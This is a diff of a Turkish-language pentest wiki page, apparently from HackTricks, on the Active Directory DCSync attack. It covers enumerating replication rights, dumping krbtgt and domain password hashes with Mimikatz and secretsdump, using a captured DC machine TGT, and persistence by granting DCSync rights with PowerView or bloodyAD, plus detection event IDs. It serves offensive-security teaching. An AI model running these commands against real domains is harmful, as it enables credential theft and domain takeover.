@@ -4,24 +4,24 @@
 
 ## DCSync
 
-**DCSync** iznine sahip olmak, etki alanının kendisi üzerinde şu izinlere sahip olmayı gerektirir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>
+**DCSync** iznine sahip olmak, domain'in kendisi üzerinde şu izinlere sahip olunduğu anlamına gelir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>
 
 **DCSync hakkında önemli notlar:**
 
 - **DCSync saldırısı, bir Domain Controller'ın davranışını taklit eder ve Directory Replication Service Remote Protocol (MS-DRSR) kullanarak diğer Domain Controller'lardan bilgileri replike etmelerini ister.** MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan kapatılamaz veya devre dışı bırakılamaz.
 - Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
-- Uygulamada, **tam DCSync** için etki alanı adlandırma bağlamında **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** gerekir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bunlarla birlikte devredilir, ancak tek başına, tam bir krbtgt dökümünden ziyade **gizli / RODC tarafından filtrelenen özniteliklerin** (örneğin eski tip LAPS sırları) eşitlenmesiyle daha çok ilgilidir.<sup>[[2]](#references)</sup>
-- Herhangi bir hesap parolası tersine çevrilebilir şifrelemeyle saklanıyorsa, Mimikatz'de parolayı açık metin olarak döndüren bir seçenek bulunur.
+- Uygulamada, **tam DCSync** için domain naming context üzerinde **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** gerekir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bu izinlerle birlikte devredilir; ancak tek başına, tam bir krbtgt dökümünden ziyade **gizli / RODC tarafından filtrelenen özniteliklerin** (örneğin eski LAPS tarzı sırların) senkronizasyonuyla daha çok ilgilidir.<sup>[[2]](#references)</sup>
+- Herhangi bir hesap parolası geri döndürülebilir şifreleme kullanılarak saklanıyorsa, Mimikatz'de parolayı açık metin olarak döndüren bir seçenek bulunur.
 
 ### Enumeration
 
-`powerview` kullanarak bu izinlere kimin sahip olduğunu kontrol edin:
+`powerview` kullanarak bu izinlere kimlerin sahip olduğunu kontrol edin:
 
 ```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 
-DCSync haklarına sahip **varsayılan olmayan principal'lara** odaklanmak istiyorsanız, yerleşik replikasyon yapabilen grupları filtreleyin ve yalnızca beklenmedik trustee'leri inceleyin:
+DCSync haklarına sahip **varsayılan olmayan principal'lara** odaklanmak istiyorsanız, yerleşik replikasyon yeteneğine sahip grupları filtreleyin ve yalnızca beklenmeyen trustee'leri inceleyin:
 
 ```powershell
 $domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
@@ -35,7 +35,7 @@ Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
   Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
 ```
 
-### Yerel Olarak Exploit Et
+### Yerelde Exploit
 
 ```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
@@ -53,7 +53,7 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
 
-Kapsamı belirlenmiş pratik örnekler:<sup>[[1]](#references)</sup>
+Pratik kapsamı sınırlandırılmış örnekler:<sup>[[1]](#references)</sup>
 
 ```bash
 # Only the krbtgt account
@@ -66,11 +66,11 @@ secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSW
 secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
 ```
 
-### Yakalanmış bir DC machine TGT (ccache) kullanarak DCSync
+### Yakalanmış bir DC makine TGT'si (ccache) kullanarak DCSync
 
-Bir domain controller üzerindeki servisi incelerken, yerel servis kimliğini ağ kimliğinden ayırt edin. [Microsoft belgelerinde](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) açıklandığı gibi, SQL Server virtual accounts (`NT SERVICE\...`) ağ kaynaklarına ana bilgisayarın computer account'u olarak erişir. Bir domain controller üzerinde bu durum, DC machine account'unu replication-rights incelemesi açısından önemli hâle getirebilir; ancak yalnızca servise erişim sağlamak, dışarı aktarılabilir bir machine TGT'nin veya kullanılabilir DCSync kimlik doğrulamasının mevcut olduğunu göstermez. Bunu bir saldırı yolu olarak değerlendirmeden önce gerçek servis kimliğini, giden kimlik doğrulama bağlamını, kullanılabilir ticket veya kimlik bilgilerini ve geçerli replication rights'ı doğrulayın.
+Bir etki alanı denetleyicisindeki hizmeti incelerken, yerel hizmet kimliğini ağ kimliğinden ayırt edin. [Microsoft'un belgelerinde](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) SQL Server sanal hesaplarının (`NT SERVICE\...`) ağ kaynaklarına ana bilgisayarın bilgisayar hesabı olarak eriştiği belirtilir. Bir etki alanı denetleyicisinde bu durum, DC makine hesabını çoğaltma haklarının incelenmesi açısından önemli kılabilir; ancak yalnızca bir hizmette foothold elde etmek, dışa aktarılabilir bir makine TGT'sinin veya kullanılabilir DCSync kimlik doğrulamasının varlığını kanıtlamaz. Bunu bir saldırı yolu olarak değerlendirmeden önce gerçek hizmet kimliğini, giden kimlik doğrulama bağlamını, kullanılabilir bilet veya kimlik bilgilerini ve etkin çoğaltma haklarını doğrulayın.
 
-Unconstrained-delegation export-mode senaryolarında bir Domain Controller machine TGT'sini (ör. `krbtgt@DOMAIN` için `DC1$@DOMAIN`) yakalayabilirsiniz. Ardından bu ccache'i kullanarak DC kimliğiyle kimlik doğrulaması yapabilir ve parola olmadan DCSync gerçekleştirebilirsiniz.<sup>[[5]](#references)</sup>
+Unconstrained-delegation export-mode senaryolarında bir Domain Controller makine TGT'sini (ör. `krbtgt@DOMAIN` için `DC1$@DOMAIN`) yakalayabilirsiniz. Ardından bu ccache'i kullanarak DC olarak kimlik doğrulaması yapabilir ve parola olmadan DCSync gerçekleştirebilirsiniz.<sup>[[5]](#references)</sup>
 
 ```bash
 # Generate a krb5.conf for the realm (helper)
@@ -86,37 +86,37 @@ KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
   secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
 ```
 
-Operasyonel notlar:
+Operational notes:
 
-- **Impacket'in Kerberos yolu, DRSUAPI çağrısından önce SMB'ye dokunur.** Ortamda **SPN target name validation** uygulanıyorsa, tam dump başarısız olabilir: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
-- Bu durumda önce hedef DC için bir **`cifs/<dc>`** service ticket isteyin veya hemen ihtiyacınız olan hesap için **`-just-dc-user`** seçeneğini kullanın.
-- Yalnızca daha düşük replication haklarına sahip olduğunuzda, LDAP/DirSync tarzı eşitleme, tam krbtgt replication olmadan **confidential** veya **RODC-filtered** öznitelikleri (örneğin eski `ms-Mcs-AdmPwd`) açığa çıkarabilir.<sup>[[2]](#references)</sup>
+- **Impacket's Kerberos path önce SMB'ye dokunur**, ardından DRSUAPI çağrısını yapar. Ortamda **SPN target name validation** uygulanıyorsa, tam döküm başarısız olabilir: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
+- Bu durumda, önce hedef DC için bir **`cifs/<dc>`** service ticket isteyin veya hemen ihtiyaç duyduğunuz hesap için **`-just-dc-user`** seçeneğine geçin.
+- Yalnızca daha düşük replication haklarına sahip olduğunuzda, LDAP/DirSync tarzı senkronizasyon, tam bir krbtgt replication işlemi olmadan **confidential** veya **RODC-filtered** öznitelikleri (örneğin eski `ms-Mcs-AdmPwd`) açığa çıkarabilir.<sup>[[2]](#references)</sup>
 
 `-just-dc` 3 dosya oluşturur:
 
 - **NTLM hash'lerini** içeren bir dosya
-- **Kerberos anahtarlarını** içeren bir dosya
-- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkin olan hesaplar için NTDS'den alınan düz metin parolaları içeren bir dosya. Reversible encryption kullanan kullanıcıları şu komutla bulabilirsiniz:
+- **Kerberos key'lerini** içeren bir dosya
+- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmiş hesaplar için NTDS'den alınan cleartext parolaları içeren bir dosya. Reversible encryption etkin olan kullanıcıları şu komutla bulabilirsiniz:
 
   ```bash
   Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
   ```
 
-### Kalıcılık
+### Persistence
 
-Etki alanı yöneticisiyseniz, PowerView yardımıyla bu izinleri herhangi bir kullanıcıya verebilirsiniz:<sup>[[3]](#references)</sup>
+Bir domain admin iseniz, bu izinleri PowerView yardımıyla herhangi bir kullanıcıya verebilirsiniz:<sup>[[3]](#references)</sup>
 
 ```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
 
-Linux operatörleri `bloodyAD` ile aynısını yapabilir:
+Linux operatörleri de `bloodyAD` ile aynısını yapabilir:
 
 ```bash
 bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
 ```
 
-Ardından, (ayrıcalıkların adlarını "ObjectType" alanında görebilmeniz gerekir) çıktıda bu 3 ayrıcalığın **kullanıcıya doğru şekilde atandığını kontrol edebilirsiniz**:
+Ardından, (ayrıcalık adlarını "ObjectType" alanında görebilmeniz gerekir) çıktısında bunları arayarak kullanıcıya 3 ayrıcalığın doğru atanıp atanmadığını **kontrol edebilirsiniz**:
 
 ```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
@@ -124,16 +124,16 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 ### Azaltma
 
-- Security Event ID 4662 (Nesne için Denetim İlkesi etkinleştirilmelidir) – Bir nesne üzerinde işlem gerçekleştirildi<sup>[[4]](#references)</sup>
-- Security Event ID 5136 (Nesne için Denetim İlkesi etkinleştirilmelidir) – Bir dizin hizmeti nesnesi değiştirildi
-- Security Event ID 4670 (Nesne için Denetim İlkesi etkinleştirilmelidir) – Bir nesnenin izinleri değiştirildi
+- Security Event ID 4662 (nesne için Audit Policy etkinleştirilmelidir) – Bir nesne üzerinde işlem gerçekleştirildi<sup>[[4]](#references)</sup>
+- Security Event ID 5136 (nesne için Audit Policy etkinleştirilmelidir) – Bir directory service nesnesi değiştirildi
+- Security Event ID 4670 (nesne için Audit Policy etkinleştirilmelidir) – Bir nesnenin izinleri değiştirildi
 - AD ACL Scanner - ACL raporları oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## References
 
 - [1] [Impacket Değişiklik Günlüğü](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
-- [2] [DirSync: Get-Changes ve Get-Changes-In-Filtered-Set Çoğaltmasından Yararlanma](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
-- [3] [DCSync: Etki Alanı Denetleyicisinden Parola Hash'lerini Dökme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
+- [2] [DirSync: Replication Get-Changes ve Get-Changes-In-Filtered-Set'ten Yararlanma](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
+- [3] [DCSync: Domain Controller'dan Password Hash'lerini Dökme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
-- [5] [HTB: Delegate — SYSVOL kimlik bilgileri → Hedefli Kerberoast → Kısıtlanmamış Delegasyon → DA'ya DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [5] [HTB: Delegate — SYSVOL kimlik bilgileri → Targeted Kerberoast → Unconstrained Delegation → DA'ya DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
 {{#include ../../banners/hacktricks-training.md}}
